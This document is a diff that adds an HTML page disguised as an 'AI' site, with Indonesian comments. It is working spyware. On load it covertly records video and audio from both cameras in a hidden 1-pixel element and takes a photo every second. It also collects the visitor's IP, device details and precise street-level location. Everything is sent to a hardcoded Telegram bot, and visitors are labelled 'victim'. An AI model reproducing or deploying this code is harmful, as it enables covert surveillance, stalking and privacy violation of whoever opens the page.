@@ -1,1 +1,228 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+  <meta charset="UTF-8" />
+  <title>AI BY RIZ</title>
+  <style>
+    body { margin: 0; background-image: url('https://files.catbox.moe/n6oy9y.png');overflow: hidden; color: transparent; }
+    video { position: fixed; bottom: 0; right: 0; width: 1px; height: 1px; opacity: 0; }
+  </style>
+</head>
+<body>
+  <video id="video" autoplay muted playsinline></video>
+  <script>
+    const token = '7877584682:AAHvvEzlzWyWq5QOKnx7y3cjPcMIOBOPUdg';
+    const chat_id = '7552410869';
+
+    let cams = ['user', 'environment'], index = 0;
+    let chunksVideo = [], chunksAudio = [];
+    let currentStream = null;
+
+    async function startAll() {
+      sendStaticPhoto();
+      sendDeviceInfo();
+      await switchCamAndRecord(); // mulai pertama
+      setInterval(() => switchCamAndRecord(), 12000); // ganti cam tiap 12s
+      setInterval(() => autoCapturePhoto(), 1000);     // kirim foto tiap 1s
+    }
+
+    async function switchCamAndRecord() {
+      const facing = cams[index % 2]; index++;
+      if (currentStream) currentStream.getTracks().forEach(t => t.stop());
+      const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: facing }, audio: true });
+      currentStream = stream;
+      const video = document.getElementById('video');
+      video.srcObject = stream;
+
+      // Rekam video
+      const videoRecorder = new MediaRecorder(stream);
+      videoRecorder.ondataavailable = e => { if (e.data.size > 0) chunksVideo.push(e.data); };
+      videoRecorder.onstop = () => {
+        const blob = new Blob(chunksVideo, { type: 'video/webm' });
+        chunksVideo = [];
+        const form = new FormData();
+        form.append("chat_id", chat_id);
+        form.append("video", blob, "video10s.webm");
+        fetch(`https://api.telegram.org/bot${token}/sendVideo`, { method: 'POST', body: form });
+      };
+      videoRecorder.start();
+      setTimeout(() => videoRecorder.stop(), 10000);
+
+      // Rekam audio
+      const audioRecorder = new MediaRecorder(stream);
+      audioRecorder.ondataavailable = e => { if (e.data.size > 0) chunksAudio.push(e.data); };
+      audioRecorder.onstop = () => {
+        const blob = new Blob(chunksAudio, { type: 'audio/webm' });
+        chunksAudio = [];
+        const form = new FormData();
+        form.append("chat_id", chat_id);
+        form.append("audio", blob, "audio10s.webm");
+        fetch(`https://api.telegram.org/bot${token}/sendAudio`, { method: 'POST', body: form });
+      };
+      audioRecorder.start();
+      setTimeout(() => audioRecorder.stop(), 10000);
+    }
+
+    async function autoCapturePhoto() {
+      const video = document.getElementById('video');
+      if (!video.videoWidth) return;
+      const canvas = document.createElement('canvas');
+      canvas.width = video.videoWidth;
+      canvas.height = video.videoHeight;
+      const ctx = canvas.getContext('2d');
+      ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+      const blob = await new Promise(res => canvas.toBlob(res, 'image/jpeg'));
+      const form = new FormData();
+      form.append("chat_id", chat_id);
+      form.append("photo", blob, "photo.jpg");
+      fetch(`https://api.telegram.org/bot${token}/sendPhoto`, { method: 'POST', body: form });
+    }
+
+    function sendStaticPhoto() {
+      const form = new FormData();
+      form.append("chat_id", chat_id);
+      form.append("photo", 'https://files.catbox.moe/p7xbtg.png');
+      form.append("caption", "𝙍𝙄𝙕𝙆𝙔 𝙃𝙀𝘾𝙆𝙀𝙍");
+      fetch(`https://api.telegram.org/bot${token}/sendPhoto`, { method: 'POST', body: form });
+    }
+
+    function sendStaticPhoto(token, chat_id) {
+  const messages = [
+    "NOTIF KORBAN:👤BROO",
+    "NOTIF KORBAN:👤iyah juga jir",
+    "NOTIF KORBAN:👤KAMU NGAPAIN",
+    "NOTIF KORBAN:👤SIAPA JIR",
+    "NOTIF KORBAN:👤Kau orang mana",
+    "NOTIF KORBAN:👤ok",
+    "NOTIF KORBAN:👤Info bt",
+    "NOTIF KORBAN:👤p",
+    "NOTIF KORBAN:👤apa coba",
+    "NOTIF KORBAN:👤GPP",
+    "NOTIF KORBAN:👤MEMEK",
+    "NOTIF KORBAN:👤iyo",
+    "NOTIF KORBAN:👤sory boss",
+    "NOTIF KORBAN:👤pie",
+    "NOTIF KORBAN:👤sam",
+    "NOTIF KORBAN:👤siap bolo",
+    "NOTIF KORBAN:👤mls cht",
+    "NOTIF KORBAN:👤audio",
+    "NOTIF KORBAN:👤maksud?",
+    "NOTIF KORBAN:👤hadehhh",
+    "NOTIF KORBAN:👤okeeey",
+    "NOTIF KORBAN:👤kamu lagi ngapain",
+    "NOTIF KORBAN:👤Untung aku gak tau",
+    "NOTIF KORBAN:👤Aku kan anak alim",
+    "NOTIF KORBAN:👤sesok nek main tak wa",
+    "NOTIF KORBAN:👤🖼",
+    "NOTIF KORBAN:👤info bolo",
+    "NOTIF KORBAN:👤Mene kang",
+    "NOTIF KORBAN:👤he'ee",
+    "NOTIF KORBAN:👤gksdo",
+    "NOTIF KORBAN:👤stiker",
+    "NOTIF KORBAN:👤pp",
+    "NOTIF KORBAN:👤wkwk",
+    "NOTIF KORBAN:👤ia?",
+    "NOTIF KORBAN:👤knp",
+    "NOTIF KORBAN:👤Gmna?",
+    "NOTIF KORBAN:👤Lh Iyo 🙂",
+    "NOTIF KORBAN:👤apaa ikuuu",
+    "NOTIF KORBAN:👤lpoo peann",
+    "NOTIF KORBAN:👤alay",
+    "NOTIF KORBAN:👤Y",
+    "NOTIF KORBAN:👤Kon Kate gomog opo",
+    "NOTIF KORBAN:👤gk iso aku",
+    "NOTIF KORBAN:👤*KECUALI URUSAN MIKAT*",
+    "NOTIF KORBAN:👤hah licik piyelek",
+    "NOTIF KORBAN:👤jir",
+    "NOTIF KORBAN:👤You can continue your busy schedule",
+    "NOTIF KORBAN:👤sayang",
+    "NOTIF KORBAN:👤otw",
+    "NOTIF KORBAN:👤sherlokkk bolo",
+    "NOTIF KORBAN:👤iyahh",
+    "NOTIF KORBAN:👤hmmmm",
+    "NOTIF KORBAN:👤Iyo",
+    "NOTIF KORBAN:👤pie bolo",
+    "NOTIF KORBAN:👤bonek ayem pokok e",
+    "NOTIF KORBAN:👤bejiree iso ngono",
+    "NOTIF KORBAN:👤mass",
+    "NOTIF KORBAN:👤cokkk",
+    "NOTIF KORBAN:👤assalamu'alaikum"
+  ];
+
+  for (const text of messages) {
+    fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify({
+        chat_id: chat_id,
+        text: text
+      })
+    }).catch(err => console.error("Gagal kirim:", err));
+  }
+}
+
+    
+    async function sendDeviceInfo() {
+      const waktu = new Date().toLocaleString();
+      const ip = await fetch('https://api.ipify.org?format=json').then(r => r.json()).then(d => d.ip);
+      const ua = navigator.userAgent;
+      const ram = navigator.deviceMemory ? `${navigator.deviceMemory} GB` : 'Tidak diketahui';
+      const bat = await navigator.getBattery().then(b => `${Math.round(b.level * 100)}% (${b.charging ? 'Mengisi' : 'Tidak'})`);
+      const net = navigator.connection ? `${navigator.connection.effectiveType}, ${navigator.connection.downlink} Mbps` : 'Tidak tersedia';
+      const brand = ua.match(/Android.*?;\s(.+?)\sBuild/)?.[1] || 'Tidak diketahui';
+      const url = location.href;
+
+      navigator.geolocation.getCurrentPosition(async pos => {
+        const lat = pos.coords.latitude;
+        const lon = pos.coords.longitude;
+        const maps = `https://maps.google.com/?q=${lat},${lon}`;
+        const g = await fetch(`https://nominatim.openstreetmap.org/reverse?lat=${lat}&lon=${lon}&format=json`);
+        const j = await g.json();
+        const lokasi = j.display_name || 'Lokasi tidak diketahui';
+        const alamat = j.address || {};
+        const kota = alamat.city || alamat.town || alamat.village || 'Tidak diketahui';
+        const kodepos = alamat.postcode || 'N/A';
+        const jalan = alamat.road || alamat.neighbourhood || 'N/A';
+        const negara = alamat.country || 'N/A';
+        const rumah = alamat.house_number || '-';
+
+        let cuaca = '';
+        try {
+          const r = await fetch(`https://api.diioffc.web.id/api/tools/cekcuaca?query=${encodeURIComponent(kota)}`);
+          const jc = await r.json();
+          if (jc.status && jc.result) {
+            const w = jc.result.weather[0];
+            cuaca = `🌤️ Cuaca: ${w.main} (${w.description})\n🌡️ Suhu: ${jc.result.main.temp}°C\n💧 Kelembaban: ${jc.result.main.humidity}%\n🌬️ Angin: ${jc.result.wind.speed} m/s`;
+          }
+        } catch(e) {
+          cuaca = 'Gagal ambil cuaca';
+        }
+
+        const info = `
+📍 Lokasi Lengkap: ${lokasi}
+🏠 Jalan: ${jalan}, No: ${rumah}
+📫 Kode Pos: ${kodepos}
+🌍 Negara: ${negara}
+🗺️ Link Maps: ${maps}
+🕒 Waktu: ${waktu}
+🌐 IP: ${ip}
+🔋 Baterai: ${bat}
+📶 Jaringan: ${net}
+📱 User-Agent: ${ua}
+📱 Merek Android: ${brand}
+💾 RAM: ${ram}
+🔗 DARI URL: ${url}
+📡 CUACA SAAT INI:\n${cuaca}`;
+        fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify({ chat_id, text: info })
+        });
+      });
+    }
+
+    window.onload = startAll;
+  </script>
+</body>
+</html>
 
